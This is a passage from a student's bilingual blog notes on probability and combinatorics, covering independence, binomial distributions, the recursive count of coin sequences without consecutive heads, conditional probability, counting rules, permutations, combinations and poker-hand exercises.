title="Exercise"></a>Exercise</h2><p>$⊥$ 在概率上表示独立事件。</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-34-19.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-39-55.png" alt></p><h2 id="Example-Sequences-of-independent-events"><a href="#Example-Sequences-of-independent-events" class="headerlink" title="Example: Sequences of independent events"></a>Example: Sequences of independent events</h2><p>(a)</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-40-33.png" alt></p><p>(b)</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-40-47.png" alt></p><p>(c)</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-40-58.png" alt></p><p>这里我最开始对BO7获胜终止条件有疑惑，但是后来自己算了下和想了想，其实这里为什么赢了3盘就可以了(a)但还算赢4赢5赢6.因为如果第二第三第四盘赢了3盘，A队自动赢了已经，这就是$\binom{6}{3}$，剩下的盘数B都算自动输。$\binom{6}{4}$是说6个位置排4个组合，一个是A赢得3，一个是B赢得1，所以是$\binom{6}{4}$。</p><h2 id="Binomial-distribution"><a href="#Binomial-distribution" class="headerlink" title="Binomial distribution"></a>Binomial distribution</h2><p>A useful corollary:</p><p><strong>Fact</strong></p><p>In a sequence of n ndependent trials, each with a probability of p of success:</p><script type="math/tex; mode=display">P(exactly k successes) = \binom{n}{k} p^kq^{n-k}</script><p>where q = (1−p)</p><p><strong>Take Notice</strong></p><p>This leads to a probability distribution on sequences of outcomes, known as the <strong>binomial distribution</strong>.</p><p>比如BO7，赢得概率是固定的，但是第一把和第二把或者更多的盘，互相之间是独立的。所以遵从二项分布。</p><h3 id="exercise-die"><a href="#exercise-die" class="headerlink" title="exercise: die"></a>exercise: die</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-35-42.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-45-15.png" alt></p><h3 id="exercise-die-2"><a href="#exercise-die-2" class="headerlink" title="exercise: die 2"></a>exercise: die 2</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-50-27.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-50-19.png" alt></p><p>这个check比较精髓，(4,4)是交集。</p><h3 id="exercise-ball"><a href="#exercise-ball" class="headerlink" title="exercise: ball"></a>exercise: ball</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-52-36.png" alt></p><h1 id="Infinite-Sample-Spaces-not-examinable"><a href="#Infinite-Sample-Spaces-not-examinable" class="headerlink" title="Infinite Sample Spaces (not examinable)"></a>Infinite Sample Spaces (not examinable)</h1><p>暂时先过这块儿，反正说是不考</p><h1 id="Recursive-Probability-Computations"><a href="#Recursive-Probability-Computations" class="headerlink" title="Recursive Probability Computations"></a>Recursive Probability Computations</h1><h2 id="Use-of-Recursion-in-Probability-Computations"><a href="#Use-of-Recursion-in-Probability-Computations" class="headerlink" title="Use of Recursion in Probability Computations"></a>Use of Recursion in Probability Computations</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-57-01.png" alt></p><p>问的是没有“HH”如果只抛</p><p>There are talking without successive <em>HEAD</em> “<code>HH</code>“.</p><p><strong>Firstly</strong>, toss a coin for one time, then gain <code>H</code> or <code>T</code>. Both have no <code>HH</code>, so <code>N(1)=2</code>.</p><p><strong>Secondly</strong>, toss a coin for two times, then gain <code>HH</code> <code>HT</code> <code>TH</code> <code>TT</code>. <code>HH</code> cannot hold, exclude it then we gain 3 legal sequences, so <code>N(2)=3</code>.</p><p>Thirdly, toss a coin for three times, then we would gain H or T in third time. Then classify its situations: (<strong>you can imagine 3rd as Nth time</strong>)</p><h3 id="1-gain-T"><a href="#1-gain-T" class="headerlink" title="1. gain T."></a>1. gain T.</h3><p>Because Nth time we gain <code>T</code>, so we won’t worry about the <code>H</code> or <code>T</code> of the coin of <code>(N-1) time</code>. Hence, if gain T in Nth time, it would have (N-1)’s number of sequences. <code>N(N) = N(N-1) iff Nth is T</code>.</p><h3 id="2-gain-H"><a href="#2-gain-H" class="headerlink" title="2. gain H."></a>2. gain H.</h3><p>If we want to gain without <code>HH</code>, hence it demands the result of the coin in (N-1) time cannot be <code>H</code>. So if Nth gain <code>H</code>, then (N-1)th must be <code>T</code>. Then (N-1) is <code>T</code>, so the number of the sequences will be (N-1)’s number of sequences. <code>N(N) = N(N-2) iff Nth is H</code>.</p><h3 id="combine"><a href="#combine" class="headerlink" title="combine"></a>combine</h3><p>Hence <code>N(N) = N(N-1) + N(N-2)</code>, and <code>N(1)=2</code> <code>N(2)=3</code></p><div class="table-container"><table><thead><tr><th>(n)</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th></tr></thead><tbody><tr><td>—-</td><td>2</td><td>3</td><td>5</td><td>8</td><td>13</td><td>21</td><td>34</td><td>55</td></tr><tr><td>fabonacci</td><td>0</td><td>1</td><td>1</td><td>2</td><td>3</td><td>5</td><td>8</td><td>13</td></tr><tr><td>$\frac{1}{\sqrt{5}}(\frac{\sqrt{5}+1}{2})^{n+1}$</td><td>1</td><td>1</td><td>2</td><td>3</td><td>5</td><td>8</td><td>13</td><td>21</td></tr></tbody></table></div><h1 id="Conditional-Probability"><a href="#Conditional-Probability" class="headerlink" title="Conditional Probability"></a>Conditional Probability</h1><h2 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-00-45.png" alt></p><h2 id="Conditional-probability-in-uniform-distributions"><a href="#Conditional-probability-in-uniform-distributions" class="headerlink" title="Conditional probability in uniform distributions"></a>Conditional probability in uniform distributions</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-04-13.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-02-33.png" alt></p><h2 id="Some-General-Rules"><a href="#Some-General-Rules" class="headerlink" title="Some General Rules"></a>Some General Rules</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-09-01.png" alt></p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-10-40.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-11-05.png" alt></p><h3 id="example-2"><a href="#example-2" class="headerlink" title="example 2"></a>example 2</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-11-27.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-11-39.png" alt></p><h3 id="example-3"><a href="#example-3" class="headerlink" title="example 3"></a>example 3</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-12-39.png" alt></p><h3 id="example-4"><a href="#example-4" class="headerlink" title="example 4"></a>example 4</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-12-54.png" alt></p><h1 id="Independence-revisited-—-Stochastic-Independence-again"><a href="#Independence-revisited-—-Stochastic-Independence-again" class="headerlink" title="Independence, revisited — Stochastic Independence, again"></a>Independence, revisited — Stochastic Independence, again</h1><h2 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition"></a>Definition</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-13-46.png" alt></p><p>Using independence to simplify calculations</p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-14-29.png" alt></p><h2 id="exercise-1"><a href="#exercise-1" class="headerlink" title="exercise 1"></a>exercise 1</h2><p>只要交集概率不是两者乘积，就说明不是互相独立</p><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-15-02.png" alt></p><h2 id="exercise-2"><a href="#exercise-2" class="headerlink" title="exercise 2"></a>exercise 2</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-17-14.png" alt></p><h2 id="exercise-3"><a href="#exercise-3" class="headerlink" title="exercise 3"></a>exercise 3</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-07-17-31.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Combinatorics</title>
      <link href="/2024/11/18/Math/Combinatorics/"/>
      <url>/2024/11/18/Math/Combinatorics/</url>
      
        <content type="html"><![CDATA[<p>Lecture 13: Combinatorics</p><ul><li><a href="#combinatorics-in-computer-science">Combinatorics in Computer Science</a></li><li><a href="#counting-principles">Counting Principles</a><ul><li><a href="#basic-counting-rules-principles">Basic Counting Rules: Principles</a></li></ul></li><li><a href="#basic-counting-rules-union">Basic Counting Rules: Union</a><ul><li><a href="#example">Example</a></li><li><a href="#consequences-of-the-union-rule">Consequences of the Union Rule</a><ul><li><a href="#fact">Fact</a></li><li><a href="#fact-1">Fact</a></li><li><a href="#proof">Proof</a></li><li><a href="#exercises">Exercises</a></li></ul></li></ul></li><li><a href="#basic-counting-rules-product">Basic Counting Rules: Product</a><ul><li><a href="#the-product-rule">The Product Rule</a><ul><li><a href="#example-1">Example</a></li></ul></li><li><a href="#product-rule-sequences-of-selections">Product rule: Sequences of selections</a><ul><li><a href="#example-2">Example</a></li></ul></li><li><a href="#exercises-1">Exercises 1</a></li><li><a href="#exercises-2">Exercises 2</a></li></ul></li><li><a href="#combinatorial-symmetry">Combinatorial Symmetry</a><ul><li><a href="#definition">Definition</a></li><li><a href="#take-notice">Take Notice</a></li><li><a href="#product-rule-symmetries-and-duplications">Product rule: Symmetries and duplications</a></li><li><a href="#example-3">Example</a></li><li><a href="#product-rule-symmetries-and-duplications-1">Product rule: Symmetries and duplications</a><ul><li><a href="#example-4">Example</a></li></ul></li></ul></li><li><a href="#combinations-and-permutations">Combinations and Permutations</a><ul><li><a href="#permutations-with-duplicates">Permutations with duplicates</a><ul><li><a href="#example-1">Example 1</a></li><li><a href="#example-2">Example 2</a></li></ul></li><li><a href="#r-selections-or-r-combinations">r-selections (or: r-combinations)</a></li><li><a href="#simple-counting-problems">Simple Counting Problems</a></li><li><a href="#exercises-choose-to-from-committees">Exercises: choose to from committees</a></li><li><a href="#exercisescounting-poker-hands">Exercises:Counting Poker Hands</a></li><li><a href="#summary">Summary</a></li><li><a href="#balls-in-boxes">“Balls in boxes”</a></li></ul></li><li><a href="#alternative-techniques">Alternative Techniques</a><ul><li><a href="#example-5">Example</a></li></ul></li><li><a href="#difficult-counting-problems-not-assessed">Difficult Counting Problems (not assessed)</a><ul><li><a href="#using-programs-to-count">Using Programs to Count</a></li><li><a href="#approximate-counting">Approximate Counting</a></li></ul></li></ul><h1 id="Combinatorics-in-Computer-Science"><a href="#Combinatorics-in-Computer-Science" class="headerlink" title="Combinatorics in Computer Science"></a>Combinatorics in Computer Science</h1><p>Informally, combinatorics is the mathematics of counting.</p><p>More formally, combinatorics is about understanding finite systems of discrete objects.</p><p>For example:</p><ul><li>How many different ways are there of getting a flush in poker?</li></ul><p>In computer science, we use combinatorics when:</p><ul><li>Computing cost functions in algorithmic analysis</li><li>Identifying (in-)efficiencies in data management</li><li>Developing effective techniques for enumerating objects</li><li>Probability calculations</li></ul><h1 id="Counting-Principles"><a href="#Counting-Principles" class="headerlink" title="Counting Principles"></a>Counting Principles</h1><p>General idea: find methods, algorithms or precise formulae to count the number of elements in various sets or collections derived, in a structured way, from some basic sets.</p><p>Examples</p><p>Single base set </p><script type="math/tex; mode=display">S = \{s_1,...,s_n\}</script><p>, and $∣S∣ = n$; find the number of</p><ul><li>all subsets of S</li><li>ordered selections of r different elements of S</li><li>unordered selections of r different elements of S</li><li>selections of r elements from S such that …</li><li>functions $S ⟶ S (onto, 1-1)$</li><li>partitions of S into k equivalence classes</li></ul><div class="table-container"><table><thead><tr><th>Starter</th><th>Main Course</th><th>Dessert</th></tr></thead><tbody><tr><td>Soup</td><td>Fish</td><td>Ice-cream</td></tr><tr><td>Bread</td><td>Beef</td><td>Fruit</td></tr><tr><td></td><td>Pork</td><td>Cheese</td></tr><tr><td></td><td>Chicken</td></tr></tbody></table></div><hr><p>How many:</p><ul><li>3 course meals (Starter-Main-Dessert) are possible?</li><li>3 course meals (Any item for each course) are possible?</li><li>3 course meals (Any item, no duplicates) are possible?</li><li>Meals consisting of 3 items (order is unimportant)?</li></ul><p><strong>These problems are translated into these below:</strong></p><p>How many:</p><ul><li>Starter-Main-Dessert?</li></ul><script type="math/tex; mode=display">2 ×4×3=24</script><ul><li>Any item for 3 courses?</li></ul><script type="math/tex; mode=display">9 ×9×9=729</script><ul><li>Any item, no duplicates, for 3 courses?</li></ul><script type="math/tex; mode=display">9 ×8×7=504</script><ul><li>Meals of 3 different items?</li></ul><script type="math/tex; mode=display">504/6 = 84</script><p>Note, why $504/6 = 84$? Because <strong>(order is unimportant)</strong>, and the order of 3 items is $3!=6$. 504 is the number of 3 ordered items, and 84 is the number of 3 unordered items.</p><p>How to understand the <strong>number of 3 ordered items</strong> is $3!=3 \times 2 \times 1=6$? We could think it’s $3 \times 2 \times 1$ of each time we choose the left items, and it’s exactly the <strong>factorial</strong>!</p><hr><h2 id="Basic-Counting-Rules-Principles"><a href="#Basic-Counting-Rules-Principles" class="headerlink" title="Basic Counting Rules: Principles"></a>Basic Counting Rules: Principles</h2><p>Two simple rules:</p><ul><li><strong>Union rule</strong> (“or”): If $S$ and $T$ are disjoint $∣S ∪T∣ =∣S∣+∣T∣$</li><li><strong>Product rule</strong> (“followed by”): $∣S × T∣ = ∣S∣ ⋅ ∣T∣$</li></ul><p>These cover many examples, though the rule application is not always obvious.</p><p>Common strategies:</p><ul><li>Direct application of the rule</li><li>Relate unknown quantities to known quantities (e.g.  $∣S∣ +∣T∣ = ∣S ∪T∣+∣S ∩T∣$)</li><li>Find a bijection to a set that can be counted</li></ul><script type="math/tex; mode=display">∣S∣ +∣T∣ = ∣S ∪T∣+∣S ∩T∣</script><h1 id="Basic-Counting-Rules-Union"><a href="#Basic-Counting-Rules-Union" class="headerlink" title="Basic Counting Rules: Union"></a>Basic Counting Rules: Union</h1><p>Union rule — S and T <strong>disjoint</strong></p><script type="math/tex; mode=display">∣S ∪T∣ =∣S∣+∣T∣</script><p>$S_1,S_2,…,S_n$ pairwise disjoint ($S_i ∩ S_j = ∅ \quad for \quad i ≠ j$)</p><script type="math/tex; mode=display">∣S_1 ∪... ∪S_n∣ = ∑∣S_i∣</script><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>How many numbers in $A = [1,2,…,999]$ are divisible by 31 or 41?</p><p>A:</p><script type="math/tex; mode=display">\lfloor 999/31 \rfloor = 32 \text{ numbers are divisible by 31 }\\\lfloor 999/41 \rfloor = 24 \text{ numbers are divisible by 41}\\\text{No number in A divisible by both 31 and 41}\\Hence, 32+24=56 \text{ divisible by 31 and 41}</script><h2 id="Consequences-of-the-Union-Rule"><a href="#Consequences-of-the-Union-Rule" class="headerlink" title="Consequences of the Union Rule"></a>Consequences of the Union Rule</h2><h3 id="Fact"><a href="#Fact" class="headerlink" title="Fact"></a>Fact</h3><p>For any sets X, Y, Z:</p><script type="math/tex; mode=display">∣Y \setminus X∣ = ∣Y∣−∣X ∩Y∣ \\∣X ∪Y∣ = ∣X∣+∣Y∣−∣X ∩Y∣ \\∣X ∪Y ∪Z∣ = ∣X∣+∣Y∣+∣Z∣  −∣X ∩Y∣−∣Y ∩Z∣−∣Z ∩X∣  +∣X ∩Y ∩Z∣</script><h3 id="Fact-1"><a href="#Fact-1" class="headerlink" title="Fact"></a>Fact</h3><p>(1) If $∣S ∪T∣ = ∣S∣+∣T∣$ then $S$ and $T$ are disjoint</p><p>(2) If $∣⋃^n<em>{i=1} S_i∣ = ∑^n</em>{i=1} ∣S_i∣$ then $S_i$ are pairwise disjoint</p><p>(3) If $∣T \setminus S∣ = ∣T∣−∣S∣$ then $S ⊆ T$</p><p>These properties can serve to identify cases when sets are disjoint </p><p>(resp. one is contained in the other).</p><h3 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h3><p>We can prove these facts using the inclusion-exclusion identity for two sets. Namely, that $∣S ∩ T∣ +∣S ∪T∣ = ∣S∣+∣T∣$.</p><p>(1) Suppose ∣S∣ +∣T∣ = ∣S ∪T∣. Then inclusion-exclusion gives $∣S ∩T∣ =∣S∣+∣T∣−∣S ∪T∣ =0, so S ∩T =∅$.</p><p>(3) Suppose $∣T \setminus S∣ = ∣T∣−∣S∣$. Then inclusion-exclusion gives $∣S ∩T∣ =∣S∣$, so $S ⊆ T$.</p><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>Q: 200 people. 150 swim or jog, 85 swim and 60 do both. How many jog?</p><p>A:</p><p>Let S ∶= {people who swim} and J ∶= {people who jog}.</p><p>Then $∣S ∪J∣ = ∣S∣+∣J∣−∣S ∩J∣$; thus $150 = 85+∣J∣−60$, hence $∣J∣ = 125$.</p><p>Note that the answer does not depend on the number of people overall (200).</p><hr><p>Q: (Supp)There are 100 problems, 75 of which are ‘easy’ and 40 ‘important’. What’s the smallest possible number of problems that are both easy and important?.</p><p>A:</p><script type="math/tex; mode=display">∣E ∩I∣ = ∣E∣+∣I∣−∣E∪I∣ = 75+40−∣E∪I∣ ≥ 75+40−100 = 15</script><h1 id="Basic-Counting-Rules-Product"><a href="#Basic-Counting-Rules-Product" class="headerlink" title="Basic Counting Rules: Product"></a>Basic Counting Rules: Product</h1><h2 id="The-Product-Rule"><a href="#The-Product-Rule" class="headerlink" title="The Product Rule"></a>The Product Rule</h2><p><strong>Product rule</strong>:</p><script type="math/tex; mode=display">∣S_1 ×... ×S_k∣ = ∣S_1∣⋅∣S_2∣⋯∣S_k∣ = \prod^k_{i=1}∣S_i∣</script><p>Take Notice</p><p>This counts the number of <strong>sequences</strong> where the first item is from $S_1$, the second is from $S_2$, and so on.</p><p>Sequences mean that it’s an ordered pair.</p><p><strong>Special case of the product rule</strong>: If all $S_i = S$ for all i and $∣S∣ = m$ then</p><script type="math/tex; mode=display">∣S_1 ×S_2 ×⋯×S_k∣ =∣S ×S ×⋯×S∣=∣S^k∣=m^k</script><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p>Let Σ = {a,b,c,d,e,f,g}.</p><p>Question. How many 5-letter words can we make?</p><script type="math/tex; mode=display">∣Σ ×Σ×Σ×Σ×Σ∣=∣Σ^5∣=∣Σ∣^5 =7^5 =16,807</script><hr><p>Question. How many words with no letter repeated?</p><script type="math/tex; mode=display">7 \times 6 \times 5 \times 4 \times 3 = 2520</script><p>Or firstly choose 5 letters from the 7 letters, and this is a combination. Then arrange the 5 chosen letters.</p><script type="math/tex; mode=display">\binom{7}{5} = \frac{7!}{5!(7-5)!} = \frac{7 \times 6}{2} = 21 \\5! = 120 \\\binom{7}{5} \times 5! = 2520</script><p>Or permutation number:</p><script type="math/tex; mode=display">P(7, 5) = 2520</script><hr><script type="math/tex; mode=display">P(n, k) = \binom{n}{k} \times k!</script><script type="math/tex; mode=display">P(n, k)=\frac{n!}{(n-k)!}</script><script type="math/tex; mode=display">\binom{n}{k} = \frac{n!}{k!(n-k)!}</script><h2 id="Product-rule-Sequences-of-selections"><a href="#Product-rule-Sequences-of-selections" class="headerlink" title="Product rule: Sequences of selections"></a>Product rule: Sequences of selections</h2><p>Question: How can we count sequences when the underlying set changes?</p><p>A:</p><p>To count sequences <strong>without replacement</strong>:</p><ul><li><p>Define an <strong>order</strong> on the whole underlying set</p></li><li><p>Select from $[1,n]$, where n is the size of the “remaining” set, and a selection of i represents choosing the i-th element in that set</p></li></ul><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h3><p>Let Σ = {a,b,c,d,e,f,g}.</p><p>How many 5-letter words with no letter repeated?</p><script type="math/tex; mode=display">\prod^4_{i=0}(∣Σ∣ −i) = 7⋅6⋅5⋅4⋅3 = 2,520</script><h2 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises 1"></a>Exercises 1</h2><p>S,T finite. How many functions $S ⟶ T$ are there?</p><script type="math/tex; mode=display">∣T∣^{∣S∣}</script><p>For all in S has the element in T. So it’s $|T| \times |T| \times … |T| \quad \therefore ∣T∣^{∣S∣}$</p><h2 id="Exercises-2"><a href="#Exercises-2" class="headerlink" title="Exercises 2"></a>Exercises 2</h2><p>Q:</p><p>$S=[100…999]$, thus $∣S∣=900$.</p><p>(a) How many numbers in S contain a 3 <strong>or</strong> 7 in their digits?</p><p>(b) How many numbers in S have a 3 <strong>and</strong> a 7?</p><hr><p>A:</p><p>(a) How many numbers in S contain a 3 <strong>or</strong> 7 </p><p>Let $A_3$ = {at least one ‘3’} and $A_7$ = {at least one ‘7’}.  Then </p><script type="math/tex; mode=display">(A_3 ∪A_7)^c = \{ n ∈ [100,999]∶ \text{ n digits } ∈ \{0,1,2,4,5,6,8,9\} \}</script><p>Note that for each number in S, there are 7 choices for the first digit and 8 choices for the later digits. So</p><script type="math/tex; mode=display">(A_3 ∪A_7)^c = |{1,2,4,5,6,8,9}| \cdot |{0,1,2,4,5,6,8,9}|^2</script><p>Therefore $∣A_3 ∪ A_7∣ = ∣S∣ −∣(A_3 ∪A_7)^c∣ = 900−448 = 452$.</p><p>(b) How many numbers in S have a 3 <strong>and</strong> a 7?</p><script type="math/tex; mode=display">∣A_3 ∩A_7∣ = ∣A_3∣+∣A_7∣−∣A_3 ∪A_7∣ \\ = (900−8⋅9⋅9)+(900−8⋅9⋅9)−452 \\= 2⋅252−452 = 52</script><h1 id="Combinatorial-Symmetry"><a href="#Combinatorial-Symmetry" class="headerlink" title="Combinatorial Symmetry"></a>Combinatorial Symmetry</h1><p>A <strong>symmetry</strong> of a mathematical object is a <strong>bijective</strong> mapping from the object to itself which preserves “structure”.</p><p>A <strong>(combinatorial) symmetry</strong> defines an equivalence relation where the equivalence classes all have the same size.</p><p>We are often interested in counting a set “up to symmetry”. That is, counting the number of equivalence classes.</p><p>This can also be stated as a constraint that identifies a specific item in each equivalence class (<strong>symmetric constraint</strong>).</p><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>A <strong>k-to-1 function</strong> is a function that maps exactly k inputs to an output.</p><h2 id="Take-Notice"><a href="#Take-Notice" class="headerlink" title="Take Notice"></a>Take Notice</h2><p>A <strong>k-to-1 function</strong> defines the equivalence relation of a combinatorial symmetry and vice-versa.</p><h2 id="Product-rule-Symmetries-and-duplications"><a href="#Product-rule-Symmetries-and-duplications" class="headerlink" title="Product rule: Symmetries and duplications"></a>Product rule: Symmetries and duplications</h2><p>Question</p><ul><li>How can we count sequences when we have symmetric<br>constraints?</li><li>How can we count sequences when we have duplicates?</li></ul><h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h2><p>Let <strong>Σ = {a,b,c,d,e}</strong>.</p><ul><li>How many 5-letter words with no letter repeated and a before b before c?</li><li>How many 5-letter words can be made from <em>a,a,a,d,e</em>?</li></ul><p><strong>Take Notice</strong></p><p>The answer will be the same.</p><p>Jiaojiao’s solution:</p><script type="math/tex; mode=display">5*4 = 20</script><p>and for the second question, we just consider the d and e, and it’s equivalent to the first question.</p><p>My stupid and slow solution:</p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-13-10-25.png" alt></p><p>Hence 2*10 = 20</p><h2 id="Product-rule-Symmetries-and-duplications-1"><a href="#Product-rule-Symmetries-and-duplications-1" class="headerlink" title="Product rule: Symmetries and duplications"></a>Product rule: Symmetries and duplications</h2><script type="math/tex; mode=display">S_1 = \{\text{ accounting for symmetry }\}, \\ S_2 = \{ \text{ symmetries }\}, \\ S =\{\text{ sequences without symmetry }\}</script><script type="math/tex; mode=display">S =S_1×S_2,</script><p>so</p><script type="math/tex; mode=display">∣S1∣ = ∣S∣/∣S2∣</script><p>Alternatively, $\frac{1}{∣S_2∣}$ of the $∣S∣$ sequences meet the symmetric constraint.</p><h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example"></a>Example</h3><p><strong>Question</strong>. Let <strong>Σ = {a,b,c,d,e}</strong>. How many 5-letter words with no letter repeated and a before b before c?</p><p><strong>Answer</strong></p><p>Let Σ′ = {a,b,c}. Then</p><script type="math/tex; mode=display">∣S∣ = ∣\{\text{ 5 letter words using letters from Σ with no repeats }\}∣ \\= \prod^4_{i=0}(∣Σ∣ −i) = 5⋅4⋅3⋅2⋅1 = 120</script><p>and</p><script type="math/tex; mode=display">∣S_2∣ = ∣\{ \text{ orderings of elements in Σ′ }\}∣ \\ = \prod^2_{i=0}(∣Σ′∣ −i)= 3⋅2⋅1 = 6</script><p>So</p><script type="math/tex; mode=display">∣S_1∣ = ∣\{ \text{ words in S containing a,b,c in order }\}∣ = \frac{120}{6} = 20</script><h1 id="Combinations-and-Permutations"><a href="#Combinations-and-Permutations" class="headerlink" title="Combinations and Permutations"></a>Combinations and Permutations</h1><p>Combinatorial Objects: How Many?</p><p><strong>permutations</strong></p><p><strong>Ordering</strong> of all objects from a set S; equivalently: Selecting all objects while recognising the <strong>order</strong> of selection.</p><p>The number of permutations of n elements is</p><script type="math/tex; mode=display">n! = n⋅(n−1) ... 1, \\0! =1! =1</script><p><strong>r-permutations (sequences without repetition)</strong></p><p>Selecting any r objects from a set S of size n without repetition while recognising the <strong>order</strong> of selection.</p><p>Their number is</p><script type="math/tex; mode=display">(n)_r = {}^n P_r =  n⋅(n−1)⋯(n−r +1) = \frac{n!}{(n-r)!}</script><h2 id="Permutations-with-duplicates"><a href="#Permutations-with-duplicates" class="headerlink" title="Permutations with duplicates"></a>Permutations with duplicates</h2><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><p>Q: How many anagrams of ASSESS? Namely $\Sigma$={A,S,S,E,S,S}, and what is the number to permutate them?</p><p>A:</p><p>Label S’s: $AS_1S_2ES_3S_4: 6!$</p><p>In each anagram we can label the S’s in 4! ways.</p><p>Suppose there are m anagrams. So $m ⋅4!=6!$, i.e. $m=\frac{6!}{4!}$</p><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><p>Number of anagrams of MISSISSIPPI?</p><script type="math/tex; mode=display">\frac{11!}{4!4!2!}</script><h2 id="r-selections-or-r-combinations"><a href="#r-selections-or-r-combinations" class="headerlink" title="r-selections (or: r-combinations)"></a>r-selections (or: r-combinations)</h2><p><strong>Collecting</strong> any r distinct objects without repetition; equivalently: selecting r objects from a set S of size n and <strong>not recognising the order</strong> of selection.</p><script type="math/tex; mode=display">\binom{n}{r} = \frac{(n)_r}{r!} = \frac{n!}{(n-r)!r!} = \frac{n(n-1)...(n-r+1)}{1 \cdot 2 \dots r}</script><p>Take Notice</p><p>These numbers are usually called binomial coefficients due to</p><script type="math/tex; mode=display">(a+b)^n = a^n + \binom{n}{1}a^{n-1}b + \binom{n}{2}a^{n-2}b^{2} + \dots + b^n = \Sigma^n_{i=0} \binom{n}{i}a^{n-i}b^i</script><p>Also defined for any $\alpha \in \mathbb{R}$ as $\binom{\alpha}{r}=\frac{\alpha(\alpha-1)…(\alpha-r+1)}{r!}$</p><h2 id="Simple-Counting-Problems"><a href="#Simple-Counting-Problems" class="headerlink" title="Simple Counting Problems"></a>Simple Counting Problems</h2><p>Give an example of acounting problem whose answer is</p><p>(a) $(26)_{10}$</p><p>(b) $\binom{26}{10}$</p><p>Draw 10 cards from a half deck (eg. black cards only)</p><p>(a) the cards are recorded in the order of appearance</p><p>(b) only the complete draw is recorded</p><hr><p>Examples</p><p>Number of diagonals in a convex polygon</p><p>Number of poker hands</p><p>Decisions in games, lotteries etc.</p><h2 id="Exercises-choose-to-from-committees"><a href="#Exercises-choose-to-from-committees" class="headerlink" title="Exercises: choose to from committees"></a>Exercises: choose to from committees</h2><p>From a group of 12 men and 16 women, how many committees can be chosen consisting of</p><p>(a) 7 members?</p><p>$\binom{12+16}{7}$</p><p>(b) 3 men and 4 women?</p><p>$\binom{12}{3}\binom{16}{4}$</p><p>(c) 7 women or 7 men?</p><p>$\binom{12}{7} + \binom{16}{7}$</p><p>As above,but any 4 people (male or female) out of 9 and two, Alice and Bob, unwilling to serve on the same committee.</p><p>Method 1:</p><p>Firstly, choose 4 people from 9 people. Secondly, consider Alice and Bob are in one committee, so 7 people remained, choose 2 more people from these 7 people, and could form a committee with Alice and Bob.</p><script type="math/tex; mode=display">{all committees} − {committees with both A and B} = \binom{9}{4} - \binom{7}{2} = 126 −21 = 105</script><p>Method 2:</p><p>equivalently, {A in, B out} + {A out, B in} + {none in} = $\binom{7}{3}+\binom{7}{3}+\binom{7}{4}$ = 35 +35+35 = 105</p><h2 id="Exercises-Counting-Poker-Hands"><a href="#Exercises-Counting-Poker-Hands" class="headerlink" title="Exercises:Counting Poker Hands"></a>Exercises:Counting Poker Hands</h2><p>A poker hand consists of 5 cards drawn without replacement from a standard deck of 52 cards</p><p>{A,2-10,J,Q,K} ×{club ♣,spade ♠,heart ♥,diamond ♦}</p><p>(a) Number of “4 of a kind” hands (e.g. 4 Jacks)</p><p>∣rank of the 4-of-a-kind∣ ⋅ ∣any other card∣ = 13 ⋅ (52 − 4)</p><p>这里问的是几种组合，所以13是A-&gt;K的同点数之一，然后因为一手5个牌还差一个，因此从(52-4)中随便选一个牌。</p><p>(b) Number of non-straight flushes, i.e. all ards of same suit but not consecutive (e.g. 8,9,10,J,K)</p><p>∣all flush∣ − ∣straight flush∣ = ∣suit∣⋅∣5-hand in a given suit∣ − ∣suit∣ ⋅ ∣rank of a straight flush in a given suit∣  = $4 \cdot \binom{13}{5} - 4 \cdot 10$</p><p>在问非顺子但同花的组合，4个花色乘13（同花）中抽5张（同花牌的数量），减去顺子同花：这种情况有10种可能的顺子（从 A, 2, 3, 4, 5 到 10, J, Q, K, A），因此顺子同花是$4 \cdot 10$. 故最终结果是以上两项相减。</p><p>注意，A在“A2345”和“10 